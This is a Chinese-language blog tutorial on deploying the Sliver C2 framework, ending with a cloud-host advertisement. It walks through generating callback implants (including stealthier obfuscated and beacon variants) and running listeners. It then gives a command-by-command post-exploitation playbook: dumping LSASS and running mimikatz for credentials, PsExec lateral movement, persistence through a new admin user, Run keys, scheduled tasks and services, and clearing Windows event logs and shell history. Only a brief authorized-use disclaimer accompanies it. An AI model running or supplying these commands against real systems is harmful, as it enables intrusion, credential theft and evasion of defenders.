---
title: Sliver C2 框架学习指南
description: 从零开始搭建 Sliver C2 测试环境，涵盖服务端部署、操作员配置、植入物生成、监听器启动以及进入靶机后的实战操作。
date: 2026-09-21
updated: 2026-09-21
categories:
  - 技术
tags:
  - 网络安全, Sliver, C2, 红队, 渗透测试
image: https://img.guoyubo.cn/img/Image-11-22-04.png
type: tech
---
# Sliver C2 框架学习指南

> 适用于新手入门，从零开始搭建 Sliver C2 测试环境。
>
> **声明**：本文档仅用于授权安全测试和靶场学习，禁止用于未授权的非法用途。

---

## 目录

1. [环境准备](#1-环境准备)
2. [服务器端安装 Sliver Server](#2-服务器端安装-sliver-server)
3. [防火墙端口放行](#3-防火墙端口放行)
4. [启动 Sliver Server](#4-启动-sliver-server)
5. [创建操作员配置（Windows 客户端连接用）](#5-创建操作员配置windows-客户端连接用)
6. [Windows 客户端安装与连接](#6-windows-客户端安装与连接)
7. [生成植入物（Implant）](#7-生成植入物implant)
8. [启动监听器](#8-启动监听器)
9. [运行植入物并获取 Session](#9-运行植入物并获取-session)
10. [Session 常用操作命令](#10-session-常用操作命令)
11. [后台保持运行（tmux）](#11-后台保持运行tmux)
12. [常见问题排查](#12-常见问题排查)

---

## 1. 环境准备

### 所需环境

| 角色 | 系统 | 说明 |
|------|------|------|
| 服务端 | CentOS 8（云服务器） | 运行 sliver-server，公网 IP |
| 客户端 | Windows 10/11 | 运行 sliver-client，远程连接服务端 |
| 靶机 | Windows | 运行植入物，回连服务端 |

### 本文档示例 IP

- 服务器公网 IP：`XX.XX.XX.XX`（替换为你自己的）
- 云服务商：三丰云免费云服务器

---

## 2. 服务器端安装 Sliver Server

### 2.1 安装 curl

```bash
dnf install curl -y
```

### 2.2 下载 sliver-server 二进制文件

> 注意：不要用 `sliver.sh/install` 一键脚本，CentOS 8 的 EPEL 仓库已失效，会因缺少 `minisign` 而失败。直接下载二进制文件。

```bash
# 下载 sliver-server（正确文件名：sliver-server_linux-amd64）
wget https://github.com/BishopFox/sliver/releases/download/v1.7.7/sliver-server_linux-amd64 -O /usr/local/bin/sliver-server

# 赋予执行权限
chmod +x /usr/local/bin/sliver-server

# 验证文件大小（应该几十MB）
ls -lh /usr/local/bin/sliver-server
```

> 如果 GitHub 下载太慢，使用镜像加速：
> ```bash
> wget https://mirror.ghproxy.com/https://github.com/BishopFox/sliver/releases/download/v1.7.7/sliver-server_linux-amd64 -O /usr/local/bin/sliver-server
> ```

---

## 3. 防火墙端口放行

### 3.1 系统防火墙（firewalld）

```bash
# 放行 mTLS 客户端连接端口
firewall-cmd --add-port=31337/tcp --permanent

# 放行 HTTP/gRPC 端口
firewall-cmd --add-port=8080/tcp --permanent

# 放行 mtls 植入物回连端口
firewall-cmd --add-port=8888/tcp --permanent

# 重新加载防火墙
firewall-cmd --reload
```

### 3.2 验证端口放行

```bash
firewall-cmd --list-ports
```

### 3.3 云平台安全组

> 三丰云免费云服务器没有云平台安全组功能，系统 firewalld 放行即可。
> 其他云服务商（阿里云、腾讯云等）需要在控制台安全组中也放行对应端口。

---

## 4. 启动 Sliver Server

### 4.1 直接启动

```bash
sliver-server
```

启动后会看到：

```
All hackers gain persist
[*] Server v1.7.7 - xxxxxxx
[*] Welcome to the sliver shell, please type 'help' for options

[server] sliver >
```

> "All hackers gain persist" 是 Sliver 开发者留的彩蛋，不是入侵提示，无需担心。

### 4.2 查看帮助

```
sliver > help
```

---

## 5. 创建操作员配置（Windows 客户端连接用）

### 5.1 生成操作员配置文件

在 sliver 控制台执行：

```
sliver > new-operator --name winadmin --lhost XX.XX.XX.XX --permissions all
```

**参数说明：**

| 参数 | 说明 |
|------|------|
| `--name winadmin` | 操作员名称 |
| `--lhost XX.XX.XX.XX` | 服务器公网 IP |
| `--permissions all` | 授予全部权限（必需） |

成功后会输出：

```
[*] Generating new client certificate, please wait ...
[*] Saved new client config to: /root/winadmin_XX.XX.XX.XX.cfg
```

### 5.2 将 cfg 文件传到 Windows

**方法 A：用 scp（推荐）**

在 Windows PowerShell 执行：

```powershell
scp root@XX.XX.XX.XX:/root/winadmin_XX.XX.XX.XX.cfg E:\sliver\
```

输入服务器 root 密码后，文件即下载到 `E:\sliver\` 目录。

**方法 B：用临时 HTTP 服务**

在服务器上执行（需要 python3）：

```bash
dnf install python3 -y
cd /root
python3 -m http.server 9090
```

放行 9090 端口：

```bash
firewall-cmd --add-port=9090/tcp --permanent && firewall-cmd --reload
```

在 Windows 浏览器访问：`http://XX.XX.XX.XX:9090`，下载 cfg 文件。

---

## 6. Windows 客户端安装与连接

### 6.1 下载 sliver-client

在 Windows 浏览器下载：

```
https://github.com/BishopFox/sliver/releases/download/v1.7.7/sliver-client_windows-amd64.exe
```

> 镜像加速：
> ```
> https://mirror.ghproxy.com/https://github.com/BishopFox/sliver/releases/download/v1.7.7/sliver-client_windows-amd64.exe
> ```

### 6.2 准备文件

将以下两个文件放在同一目录（如 `E:\sliver`）：

- `sliver-client_windows-amd64.exe`
- `winadmin_XX.XX.XX.XX.cfg`

### 6.3 清理旧配置（如果之前装过 Sliver）

```powershell
# 查看是否有旧的环境变量指向不存在路径
Get-ChildItem env: | Where-Object { $_.Name -like "*SLIVER*" }

# 如果有指向不存在路径的环境变量，清除
[Environment]::SetEnvironmentVariable("SLIVER_CLIENT_ROOT_DIR", $null, "User")
[Environment]::SetEnvironmentVariable("SLIVER_ROOT_DIR", $null, "User")

# 删除旧配置目录
Remove-Item -Recurse -Force "$env:USERPROFILE\.sliver" -ErrorAction SilentlyContinue
Remove-Item -Recurse -Force "$env:USERPROFILE\.sliver-client" -ErrorAction SilentlyContinue
```

### 6.4 导入配置并连接

```powershell
# 进入文件所在目录
cd E:\sliver

# 导入配置
.\sliver-client_windows-amd64.exe import winadmin_XX.XX.XX.XX.cfg

# 连接服务器
.\sliver-client_windows-amd64.exe
```

连接成功后会看到：

```
[XX.XX.XX.XX] sliver >
```

### 6.5 验证连接

```
sliver > jobs
```

能看到服务端运行的监听器列表。

---

## 7. 生成植入物（Implant）

### 7.1 基本生成命令

在 Windows 客户端的 sliver 控制台执行：

```
sliver > generate --os windows --arch amd64 --mtls XX.XX.XX.XX:8888 --skip-symbols --save E:\sliver
```

**参数说明：**

| 参数 | 说明 |
|------|------|
| `--os windows` | 目标操作系统 |
| `--arch amd64` | CPU 架构 |
| `--mtls XX.XX.XX.XX:8888` | mTLS 回连地址和端口 |
| `--skip-symbols` | 跳过符号混淆，编译更快（但更易被杀软检测） |
| `--save E:\sliver` | 保存路径 |

### 7.2 不带 skip-symbols 的隐蔽版本

```
sliver > generate --os windows --arch amd64 --mtls XX.XX.XX.XX:8888 --save E:\sliver
```

> 编译时间更长（5-15分钟），但隐蔽性更高。

### 7.3 Beacon 模式（延迟回连）

```
sliver > generate --os windows --arch amd64 --mtls XX.XX.XX.XX:8888 --beacon 60s --skip-symbols --save E:\sliver
```

> Beacon 模式会定期回连（如每60秒），比 session 模式更隐蔽。

### 7.4 生成完成

```
[*] Generating new windows/amd64 implant binary
[!] Symbol obfuscation is disabled
[*] Build completed in 26s
[*] Implant saved to: E:\sliver\sliver.exe
```

---

## 8. 启动监听器

### 8.1 启动 mTLS 监听器

```
sliver > mtls
```

成功输出：

```
[*] Starting mTLS listener ...
[*] Successfully started job #2
```

### 8.2 指定端口启动

```
sliver > mtls --lhost 0.0.0.0 --lport 8888
```

### 8.3 查看运行中的监听器

```
sliver > jobs
```

输出示例：

```
 ID   Name        Protocol   Port    Domains
==== =========== ========== ======= =========
 1    grpc/mtls   tcp        31337
 2    mtls        tcp        8888
```

> - 31337：客户端连接服务端用的 gRPC/mTLS 端口
> - 8888：植入物回连用的 mTLS 端口

### 8.4 停止监听器

```
sliver > jobs -k <ID>
```

---

## 9. 运行植入物并获取 Session

### 9.1 在靶机上运行植入物

```powershell
# Windows PowerShell
Start-Process E:\sliver\sliver.exe
```

> 植入物运行后没有任何界面输出，这是正常的（静默后台运行）。

### 9.2 查看回连的 Session

在 sliver 控制台执行：

```
sliver > sessions
```

输出示例：

```
 ID         Name           Transport   Remote Address          Hostname          Username   Process (PID)                  Integrity   Operating System   Locale   Last Message                             Health
========== ============== =========== ======================= ================= ========== ============================== =========== ================== ======== ======================================== =========
 b9540e38   CLEAN_HEYDAY   mtls        XX.XX.XX.XX:12058   DESKTOP-2U6O230   guoji      E:\sliver\sliver.exe (11908)   -           windows/amd64      zh-CN    Mon Sep 21 18:50:06 CST 2026 (34s ago)   [ALIVE]
```

### 9.3 进入 Session

```
sliver > use b9540e38
```

> 使用 session 的 ID（或使用 `use 1` 按序号选择）。

### 9.4 Windows 到服务器端口连通性测试

```powershell
# 测试 mTLS 端口
Test-NetConnection -ComputerName XX.XX.XX.XX -Port 8888

# 测试 gRPC 端口
Test-NetConnection -ComputerName XX.XX.XX.XX -Port 31337
```

> `TcpTestSucceeded : True` 表示端口通。

---

## 10. Session 常用操作命令

进入 session 后（`sliver (session) >`），可以执行以下命令：

### 10.1 基础命令

| 命令 | 说明 |
|------|------|
| `help` | 查看所有可用命令 |
| `shell` | 获取交互式 shell |
| `whoami` | 查看当前用户 |
| `getuid` | 查看当前权限 |
| `info` | 查看 session 详细信息 |
| `exit` | 退出 session（不关闭植入物） |

### 10.2 文件操作

| 命令 | 说明 |
|------|------|
| `ls` | 列出当前目录 |
| `ls C:\` | 列出指定目录 |
| `cat C:\Users\test.txt` | 查看文件内容 |
| `download C:\Users\test.txt` | 下载文件到本地 |
| `upload E:\tools\test.exe C:\Users\test.exe` | 上传文件到靶机 |

### 10.3 系统信息

| 命令 | 说明 |
|------|------|
| `ps` | 查看进程列表 |
| `netstat` | 查看网络连接 |
| `ifconfig` | 查看网卡信息 |
| `hostname` | 查看主机名 |

### 10.4 进程操作

| 命令 | 说明 |
|------|------|
| `ps` | 查看进程 |
| `terminate <PID>` | 终止指定进程 |

### 10.5 其他操作

| 命令 | 说明 |
|------|------|
| `screenshot` | 截屏 |
| `procdump` | 进程转储 |
| `migrate <PID>` | 迁移到其他进程 |
| `privs` | 查看可用权限 |

---

## 11. 后台保持运行（tmux）

> 直接关闭 SSH 窗口会杀掉 sliver-server 进程，导致植入物无法回连。使用 tmux 可以保持后台运行。

### 11.1 安装 tmux

```bash
dnf install tmux -y
```

### 11.2 创建 tmux 会话

```bash
# 创建名为 sliver 的会话
tmux new -s sliver

# 在 tmux 内启动 sliver-server
sliver-server

# 启动监听
multiplayer
mtls
```

### 11.3 退出 tmux（保持后台运行）

按 `Ctrl+B`，松开后按 `D`

> sliver-server 继续在后台运行，可以安全关闭 SSH 窗口。

### 11.4 重新进入 tmux 会话

```bash
tmux attach -s sliver
```

### 11.5 nohup 方式（替代方案）

```bash
nohup sliver-server &
```

> 缺点：无法再进入 sliver 控制台交互。

---

## 12. 常见问题排查

### Q1：sliver.sh/install 一键脚本失败

**原因**：CentOS 8 的 EPEL 仓库已失效，缺少 `minisign` 依赖。

**解决**：直接下载二进制文件，不走安装脚本。

```bash
wget https://github.com/BishopFox/sliver/releases/download/v1.7.7/sliver-server_linux-amd64 -O /usr/local/bin/sliver-server
chmod +x /usr/local/bin/sliver-server
```

### Q2：GitHub 下载太慢或失败

**解决**：使用镜像加速。

```bash
# 镜像方案 1
wget https://mirror.ghproxy.com/https://github.com/BishopFox/sliver/releases/download/v1.7.7/sliver-server_linux-amd64 -O /usr/local/bin/sliver-server

# 镜像方案 2
wget https://gh-proxy.com/https://github.com/BishopFox/sliver/releases/download/v1.7.7/sliver-server_linux-amd64 -O /usr/local/bin/sliver-server
```

### Q3：sliver-server 提示 "未找到命令"

**原因**：二进制文件下载失败（0 字节）或路径不对。

**排查**：

```bash
ls -lh /usr/local/bin/sliver-server
```

如果文件大小为 0，说明下载失败，重新下载。

### Q4：Windows 客户端连接超时

**排查步骤**：

1. 确认 sliver-server 在运行：
   ```bash
   ss -tlnp | grep 31337
   ```

2. 确认 multiplayer 监听已启动（在 sliver 控制台执行 `multiplayer`）

3. 测试端口连通性：
   ```powershell
   Test-NetConnection -ComputerName XX.XX.XX.XX -Port 31337
   ```

4. 确认防火墙放行：
   ```bash
   firewall-cmd --list-ports
   ```

### Q5：Windows 客户端报错 "mkdir F:\xxx: The system cannot find the path specified"

**原因**：之前安装过 Sliver，环境变量指向了不存在的路径（如移动硬盘）。

**解决**：

```powershell
# 查看环境变量
Get-ChildItem env: | Where-Object { $_.Name -like "*SLIVER*" }

# 临时覆盖
$env:SLIVER_CLIENT_ROOT_DIR = "$env:USERPROFILE\.sliver-client"
$env:SLIVER_ROOT_DIR = "$env:USERPROFILE\.sliver"

# 永久清除
[Environment]::SetEnvironmentVariable("SLIVER_CLIENT_ROOT_DIR", $null, "User")
[Environment]::SetEnvironmentVariable("SLIVER_ROOT_DIR", $null, "User")
```

### Q6：植入物运行后 sessions 为空

**排查步骤**：

1. 确认监听器端口和植入物回连端口一致：
   ```
   sliver > jobs
   ```
   如果植入物回连 8888，监听器也要在 8888。

2. 确认端口连通：
   ```powershell
   Test-NetConnection -ComputerName XX.XX.XX.XX -Port 8888
   ```

3. 放行对应端口：
   ```bash
   firewall-cmd --add-port=8888/tcp --permanent && firewall-cmd --reload
   ```

4. 检查植入物进程是否在运行：
   ```powershell
   Get-Process sliver
   ```

5. 检查 Windows Defender 是否拦截了植入物。

### Q7：关闭 SSH 后 sliver-server 停止

**原因**：直接关闭 SSH 会杀掉所有子进程。

**解决**：使用 tmux 保持后台运行。

```bash
tmux new -s sliver
sliver-server
# Ctrl+B 然后 D 退出 tmux
```

### Q8：端口被占用 "port xxx is in use"

**原因**：监听器已经在运行，不需要重复启动。

**确认**：

```
sliver > jobs
```

如果已有对应端口的 job，直接使用即可。

---

## 13. 进入靶机后的实战操作

> 进入 session 后（`sliver (session) >`），可以进行以下操作。
> 所有命令均在 sliver session 控制台内执行。

### 13.1 信息收集

#### 查看当前用户和权限

```
sliver (session) > whoami
sliver (session) > getuid
```

#### 查看系统信息

```
sliver (session) > info
```

输出包含：主机名、用户名、进程名、PID、操作系统、架构等。

#### 查看网卡信息

```
sliver (session) > ifconfig
```

获取靶机所有网卡的 IP 地址、MAC 地址、子网掩码。

#### 查看网络连接

```
sliver (session) > netstat
```

查看所有活动的 TCP/UDP 连接，可用于发现内网其他服务。

#### 查看进程列表

```
sliver (session) > ps
```

#### 查看当前权限

```
sliver (session) > privs
```

---

### 13.2 文件操作

#### 列目录

```
sliver (session) > ls
sliver (session) > ls C:\Users
sliver (session) > ls C:\Users\guoji\Desktop
```

#### 查看文件内容

```
sliver (session) > cat C:\Users\guoji\Desktop\test.txt
sliver (session) > cat C:\Windows\System32\drivers\etc\hosts
```

#### 下载文件（靶机 → 本地）

```
sliver (session) > download C:\Users\guoji\Desktop\secret.txt
```

文件会下载到 sliver-client 所在目录（如 `E:\sliver`）。

#### 上传文件（本地 → 靶机）

```
sliver (session) > upload E:\tools\mimikatz.exe C:\Users\guoji\mimikatz.exe
```

#### 查看文件属性

```
sliver (session) > stat C:\Users\guoji\Desktop\test.txt
```

#### 删除文件

```
sliver (session) > rm C:\Users\guoji\test.txt
```

#### 创建目录

```
sliver (session) > mkdir C:\Users\guoji\test
```

---

### 13.3 获取交互式 Shell

```
sliver (session) > shell
```

进入靶机的命令行 shell，可以直接执行 Windows 命令：

```
whoami
ipconfig
net user
tasklist
```

退出 shell 返回 sliver：

```
exit
```

#### 执行单条命令（不进入 shell）

```
sliver (session) > execute whoami
sliver (session) > execute ipconfig
sliver (session) > execute net user
sliver (session) > execute tasklist
sliver (session) > execute systeminfo
```

---

### 13.4 截屏

```
sliver (session) > screenshot
```

截图会保存到 sliver-client 所在目录。

---

### 13.5 进程操作

#### 查看进程

```
sliver (session) > ps
```

#### 终止进程

```
sliver (session) > terminate 1234
```

#### 进程迁移

```
sliver (session) > migrate 5678
```

将植入物迁移到其他进程，可用于：
- 权限提升（迁移到高权限进程）
- 持久化（当前进程被杀后仍存活）
- 隐蔽（迁移到正常系统进程）

#### 进程转储

```
sliver (session) > procdump
sliver (session) > procdump --pid 1234
```

转储进程内存，可用于提取凭据（如 lsass.exe）。

---

### 13.6 内网信息收集

#### 查看路由表

```
sliver (session) > execute route print
```

#### 查看 ARP 表

```
sliver (session) > execute arp -a
```

#### 扫描内网存活主机

```
sliver (session) > execute ping 192.168.1.1
sliver (session) > execute ping 192.168.1.2
```

#### 查看共享

```
sliver (session) > execute net share
sliver (session) > execute net view
```

#### 查看域信息

```
sliver (session) > execute net config workstation
sliver (session) > execute net user /domain
sliver (session) > execute net group /domain
sliver (session) > execute net accounts /domain
```

#### 查看开放端口

```
sliver (session) > execute netstat -ano
```

---

### 13.7 权限提升

#### 查看当前权限

```
sliver (session) > privs
sliver (session) > execute whoami /priv
```

#### 查看已安装的补丁

```
sliver (session) > execute wmic qfe list brief
```

#### 查看系统信息

```
sliver (session) > execute systeminfo
```

> 根据补丁信息和系统版本，查找对应的提权漏洞。

#### 上传提权工具

```
sliver (session) > upload E:\tools\WinPEAS.exe C:\Users\guoji\WinPEAS.exe
sliver (session) > execute C:\Users\guoji\WinPEAS.exe
```

#### 检查可写路径

```
sliver (session) > execute accesschk.exe -w -u "Everyone" C:\
```

---

### 13.8 凭据获取

#### 抓取 lsass 进程内存

```
sliver (session) > procdump --pid <lsass的PID>
```

先通过 `ps` 找到 lsass.exe 的 PID，然后转储。

#### 上传 mimikatz 抓取明文/hash

```
sliver (session) > upload E:\tools\mimikatz.exe C:\Users\guoji\mimikatz.exe
sliver (session) > execute C:\Users\guoji\mimikatz.exe "sekurlsa::logonpasswords" "exit"
```

#### 查看浏览器保存的凭据

```
sliver (session) > ls C:\Users\guoji\AppData\Local\Google\Chrome\User Data\Default\Login Data
```

#### 查看已保存的 WiFi 密码

```
sliver (session) > execute netsh wlan show profile
sliver (session) > execute netsh wlan show profile name="WiFi名称" key=clear
```

---

### 13.9 横向移动

#### 查看内网其他主机

```
sliver (session) > execute net view
sliver (session) > execute net view /domain
```

#### 查看域控

```
sliver (session) > execute nltest /dclist:域名
sliver (session) > execute net group "Domain Controllers" /domain
```

#### 查看域管理员

```
sliver (session) > execute net group "Domain Admins" /domain
```

#### 使用 PSEXEC 横向

```
sliver (session) > upload E:\tools\PSTools\PsExec.exe C:\Users\guoji\PsExec.exe
sliver (session) > execute C:\Users\guoji\PsExec.exe \\192.168.1.10 -u 域名\用户名 -p 密码 cmd.exe
```

---

### 13.10 持久化

#### 添加用户

```
sliver (session) > execute net user hacker Password123! /add
sliver (session) > execute net localgroup Administrators hacker /add
```

#### 添加注册表自启动

```
sliver (session) > execute reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Update /t REG_SZ /d "C:\Users\guoji\sliver.exe" /f
```

#### 添加计划任务

```
sliver (session) > execute schtasks /create /tn "SystemUpdate" /tr "C:\Users\guoji\sliver.exe" /sc daily /st 09:00 /f
```

#### 添加服务

```
sliver (session) > execute sc create SystemUpdate binpath= "C:\Users\guoji\sliver.exe" start= auto
sliver (session) > execute sc start SystemUpdate
```

---

### 13.11 隐蔽操作

#### 设置环境变量（清除命令历史）

```
sliver (session) > execute cmd /c "del /f /q C:\Users\guoji\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
```

#### 清除事件日志

```
sliver (session) > execute wevtutil cl System
sliver (session) > execute wevtutil cl Security
sliver (session) > execute wevtutil cl Application
```

#### 隐藏文件

```
sliver (session) > execute attrib +h C:\Users\guoji\sliver.exe
```

---

### 13.12 SOCKS5 代理

#### 启动 SOCKS5 代理

```
sliver (session) > socks5
```

> 在靶机上开启 SOCKS5 代理，可以通过该代理访问靶机内网。
> 配合 proxychains 或浏览器代理设置使用。

#### 启动端口转发

```
sliver (session) > portfwd add --remote 192.168.1.10:445 --local 127.0.0.1:4445
```

> 将靶机内网的 192.168.1.10:445 转发到本地 4445 端口。

#### 查看端口转发

```
sliver (session) > portfwd list
```

#### 删除端口转发

```
sliver (session) > portfwd rm --id <ID>
```

---

### 13.13 WireGuard 隧道（可选）

#### 启动 WireGuard 接口

```
sliver (session) > wg-port
```

> 创建 WireGuard 隧道，可以获得靶机内网的完整网络访问能力。
> 需要在生成植入物时添加 `--enable-wg` 参数。

---

### 13.14 退出 Session

#### 退出但保持植入物运行

```
sliver (session) > background
```

#### 关闭植入物

```
sliver (session) > exit
```

> `exit` 会终止植入物进程，session 断开。需要重新运行植入物才能再次回连。

---

### 13.15 实战操作流程速查

| 阶段 | 命令 | 目的 |
|------|------|------|
| 信息收集 | `whoami` / `getuid` / `ifconfig` / `netstat` / `ps` | 了解靶机基本信息 |
| 文件浏览 | `ls` / `cat` / `download` | 查看和下载敏感文件 |
| 交互操作 | `shell` | 获取完整命令行 |
| 截屏 | `screenshot` | 查看靶机屏幕 |
| 凭据获取 | `procdump` / `upload mimikatz` | 提取密码 |
| 权限提升 | `migrate` / `execute systeminfo` | 提权到 SYSTEM |
| 横向移动 | `execute net view` / `portfwd` | 探索和访问内网 |
| 持久化 | `execute schtasks` / `reg add` | 保持访问权限 |
| 内网代理 | `socks5` / `portfwd` | 代理访问内网资源 |

---

## 附录：端口说明

| 端口 | 用途 | 需要放行 |
|------|------|---------|
| 31337 | gRPC/mTLS（客户端连接服务端） | 是 |
| 8888 | mTLS（植入物回连） | 是 |
| 8080 | HTTP（可选，HTTP 回连方式） | 是 |
| 9090 | 临时 HTTP 服务（传文件用，用完可关） | 临时 |

---

## 附录：Sliver 命令速查

### 服务器端 sliver 控制台命令

| 命令 | 说明 |
|------|------|
| `help` | 查看帮助 |
| `new-operator --name xxx --lhost IP --permissions all` | 创建操作员配置 |
| `multiplayer` | 启动 multiplayer 模式（客户端远程连接） |
| `mtls` | 启动 mTLS 监听器 |
| `mtls --lhost 0.0.0.0 --lport 8888` | 指定端口启动 mTLS 监听 |
| `jobs` | 查看运行中的监听器 |
| `jobs -k <ID>` | 停止指定监听器 |
| `generate --os windows --arch amd64 --mtls IP:8888 --skip-symbols --save PATH` | 生成植入物 |
| `sessions` | 查看所有 session |
| `use <ID>` | 进入指定 session |
| `exit` | 退出 sliver 控制台 |

### Session 内命令

| 命令 | 说明 |
|------|------|
| `shell` | 交互式 shell |
| `whoami` | 当前用户 |
| `getuid` | 当前权限 |
| `ls` | 列目录 |
| `cat <path>` | 查看文件 |
| `download <path>` | 下载文件 |
| `upload <local> <remote>` | 上传文件 |
| `ps` | 进程列表 |
| `netstat` | 网络连接 |
| `ifconfig` | 网卡信息 |
| `screenshot` | 截屏 |
| `info` | session 信息 |

---

*文档编写日期：2026-09-21*
*Sliver 版本：v1.7.7*

---

在学习Sliver C2的过程中，我选用了三丰云的免费云服务器作为练习环境。三丰云提供的免费虚拟主机、免费云服务器非常适合网络安全新手用来搭建测试环境，服务器支持SSH、VNC两种方式远程连接，能够自行重装CentOS、Ubuntu等主流Linux系统。我在这台2核2G实例上完成Sliver服务端部署、端口放行、操作员证书生成等一系列实操，用来熟悉C2的整套工作流程，用来做技术练手性价比很高。

https://www.sanfengyun.com
